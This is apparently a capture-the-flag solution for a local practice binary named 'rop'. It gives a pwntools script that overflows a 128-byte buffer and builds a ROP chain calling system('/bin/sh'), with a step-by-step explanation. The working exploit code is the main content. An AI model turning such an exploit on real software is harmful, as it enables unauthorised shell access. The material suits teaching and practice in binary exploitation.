To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` by crafting a ROP chain to execute a shell. Here are the steps and the corresponding code:

### Steps to Solve the Challenge

1. **Identify the Vulnerability**: The `vulnerable_function` reads up to 512 bytes into a buffer of size 128, causing a buffer overflow.

2. **Find Useful Gadgets**: Use ROPgadget to find useful gadgets that can help us control the execution flow and eventually execute a shell.

3. **Locate the System Function and "/bin/sh" String**: We need to find the address of the `system` function and the string `"/bin/sh"` in the binary or its libraries.

4. **Craft the ROP Chain**: Construct a ROP chain that will call `system("/bin/sh")`.

5. **Send the Payload**: Use `pwntools` to send the crafted payload to the binary.

### Code Implementation

```python
from pwn import *

# Set up the context
context.binary = 'rop'
context.arch = 'amd64'
context.os = 'linux'

# Start the process
p = process('rop')

# Find the base address of the binary
elf = ELF('rop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust this path if necessary

# Find the offset to the return address
offset = 128 + 8  # 128 bytes for the buffer + 8 bytes for the saved RBP

# Find the gadgets
pop_rdi_ret = 0x00000000004006b3  # pop rdi ; ret
system_plt = elf.plt['system']
bin_sh = next(elf.search(b'/bin/sh'))

# Craft the ROP chain
rop_chain = b'A' * offset
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(bin_sh)
rop_chain += p64(system_plt)

# Send the payload
p.sendline(rop_chain)

# Interact with the shell
p.interactive()
```

### Explanation

1. **Context Setup**:
   - `context.binary = 'rop'`: Set the binary context.
   - `context.arch = 'amd64'`: Set the architecture to 64-bit.
   - `context.os = 'linux'`: Set the operating system to Linux.

2. **Process Start**:
   - `p = process('rop')`: Start the process.

3. **Binary and Library Information**:
   - `elf = ELF('rop')`: Load the binary.
   - `libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')`: Load the libc library (adjust the path if necessary).

4. **Offset Calculation**:
   - `offset = 128 + 8`: Calculate the offset to the return address.

5. **Gadget Finding**:
   - `pop_rdi_ret = 0x00000000004006b3`: Address of the `pop rdi ; ret` gadget.
   - `system_plt = elf.plt['system']`: Address of the `system` function in the PLT.
   - `bin_sh = next(elf.search(b'/bin/sh'))`: Address of the `"/bin/sh"` string in the binary.

6. **ROP Chain Construction**:
   - `rop_chain = b'A' * offset`: Fill the buffer and saved RBP.
   - `rop_chain += p64(pop_rdi_ret)`: Add the `pop rdi ; ret` gadget.
   - `rop_chain += p64(bin_sh)`: Set the `RDI` register to point to `"/bin/sh"`.
   - `rop_chain += p64(system_plt)`: Call the `system` function.

7. **Payload Sending**:
   - `p.sendline(rop_chain)`: Send the payload to the binary.

8. **Interactive Shell**:
   - `p.interactive()`: Interact with the shell.

This script should give you a shell when executed, allowing you to control the binary and potentially gain further access. Make sure to adjust paths and addresses if they differ in your environment.
